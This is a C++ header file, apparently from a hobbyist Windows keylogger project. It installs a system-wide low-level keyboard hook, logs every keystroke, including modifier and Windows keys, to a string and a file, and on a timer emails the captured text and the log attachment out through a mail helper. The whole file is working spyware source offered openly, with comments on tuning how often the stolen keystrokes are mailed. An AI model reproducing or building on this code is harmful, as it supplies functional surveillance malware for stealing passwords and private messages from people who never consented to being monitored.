#ifndef KEYBHOOK_H_INCLUDED
#define KEYBHOOK_H_INCLUDED

#include <iostream>
#include <fstream>
#include "windows.h"
#include "keyconstants.h"
#include "timer.h"
#include "sendmail.h"

//Keybhook.h
//we gonna use hooks to keep track of keystrokes
//this is the heart and soul of this project

//keylog string has all the keystrokes
std::string keylog = "";

void TimerSendMail()
{
    //if keylog is empty: return
    if(keylog.empty())
    {
        return;
    }
    //if keylog is not empty, write it to a file
    std::string last_file = IO::WriteLog(keylog);

    //if file creation was unsuccessful: write to debugging log
    if(last_file.empty())
    {
        Helper::WriteAppLog("File Creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe File has been attached\n"
                           "Testing, enjoy\n" + keylog,
                            IO::GetOurPath(true) + last_file);
    //checking if mail was sent
    if(x != 7)
    {
        Helper::WriteAppLog("Mail was not sent. error code: " + Helper::ToString(x));
    }
    else
    {   //clearing keystroke log
        keylog = "";
    }

}

//this is where you would change how often you get mail
//values are in milliseconds
Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = NULL;

//the heart!!!
//function keeping track of the keystrokes
//uses Windows API
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode <0)
    {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    //if a key is pressed
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        //append the pressed keys to the keylog string
        //how do we know which keys were pressed?
        //refere to the keyconstants.h file for more info
        keylog += Keys::KEYS[kbs->vkCode].Name;

        //if enter is logged, actually include a newline in keylog
        if(kbs->vkCode == VK_RETURN)
        {
            keylog += '\n';

        }
    }
    //keeping track if the system keys are up
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key= kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
           )
        {
            //adds which system keys were pressed and inserts
            //a "/" if it was let go to signify when it was let go
           std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
           KeyName.insert(1, "/");
           keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);
    //if eHook == Null return true, else return false
    return eHook == NULL;
}

//prevents keylogging: uninstalls the hook
//program still runs tho
bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H_INCLUDED
